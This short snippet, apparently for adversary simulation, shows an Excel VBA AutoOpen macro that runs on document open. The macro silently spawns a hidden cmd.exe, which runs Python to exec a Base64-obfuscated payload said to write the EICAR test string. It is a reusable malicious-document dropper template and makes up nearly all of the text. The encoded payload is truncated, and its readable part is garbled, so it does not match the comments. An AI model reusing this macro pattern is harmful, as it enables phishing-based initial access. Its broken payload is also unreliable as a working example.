# Excel VBA Macro → Python Dropper
# This simulates phishing or initial access where:
# A malicious Excel document has a macro (VBA script).
# The macro launches Python to execute a payload (e.g., an EICAR dropper).
# Excel VBA Macro (AutoOpen)

Sub AutoOpen()
    Dim pyCommand As String
    pyCommand = "cmd.exe /c python -c ""import base64;exec(base64.b64decode('aW1wb3J0IHdpcnRlOyB3aXJ0ZSgiWDVPKVB...==' ))"""
    
    Shell pyCommand, vbHide
End Sub

# What it does:
# AutoOpen runs when the document is opened.
# It constructs a command to run python -c <payload>.
# The Python payload is Base64-encoded for obfuscation.
# What the Python does: Writes or generates the EICAR string.
